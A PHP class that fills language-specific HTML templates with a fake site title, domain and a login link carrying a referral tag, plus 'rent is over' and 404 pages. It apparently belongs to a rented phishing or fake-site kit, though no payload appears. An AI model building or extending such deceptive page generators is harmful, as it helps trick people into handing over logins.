<?php
require_once("classFake.php");

	class PageGenerator {
		private $PathToTemplate;
		private $Lang;
		
		function __construct($PathToTemplate, $Lang){
			$this->Lang = $Lang;
			$this->PathToTemplate = $PathToTemplate . "/" . strtolower($Lang);
			
			if (!is_dir($this->PathToTemplate)) $this->PathToTemplate = $PathToTemplate . "/other";
		}
		
		public function GenerateIndex($ref){
			$content = file_get_contents($this->PathToTemplate . "/index.html");
			
			$Fake = new classFake();
			
			$title = $Fake->s_GetFakeTitle();
			$tempArr = explode(".", $title);
			$domain_name = $tempArr[0];
			$domain_zone = $tempArr[1];
			
			$content = str_replace
			(
				array("%title%", "%domain_name%", "%domain_zone%", "%login-link%"),
				array($title, $domain_name, $domain_zone, $Fake->s_GetLoginLink() . "&ref=" . $ref),
				$content
			);
			
			return $content;
		}

		public function GenerateRules($ref){
			$content = file_get_contents($this->PathToTemplate . "/rules.html");
			
			$Fake = new classFake();
			
			$title = $Fake->s_GetFakeTitle();
			$tempArr = explode(".", $title);
			$domain_name = $tempArr[0];
			$domain_zone = $tempArr[1];
			
			$content = str_replace
			(
				array("%title%", "%domain_name%", "%domain_zone%", "%login-link%"),
				array($title, $domain_name, $domain_zone, $Fake->s_GetLoginLink() . "&ref=" . $ref),
				$content
			);
			
			return $content;
		}
		
		public function GenerateError($ref){
			$content = file_get_contents($this->PathToTemplate . "/error.html");
			
			$Fake = new classFake();
			
			$title = $Fake->s_GetFakeTitle();
			$tempArr = explode(".", $title);
			$domain_name = $tempArr[0];
			$domain_zone = $tempArr[1];
			
			$content = str_replace
			(
				array("%title%", "%domain_name%", "%domain_zone%", "%login-link%"),
				array($title, $domain_name, $domain_zone, $Fake->s_GetLoginLink() . "&ref=" . $ref),
				$content
			);
			
			return $content;
		}
		
		public function Generate404(){
			$content = file_get_contents($this->PathToTemplate . "/../../404.html");
			
			return $content;
		}
		
		public function GenerateRentIsOver(){
			$Page = file_get_contents($this->PathToTemplate . "/../../rent_is_over.html");
			
			return $Page;
		}
	}
?>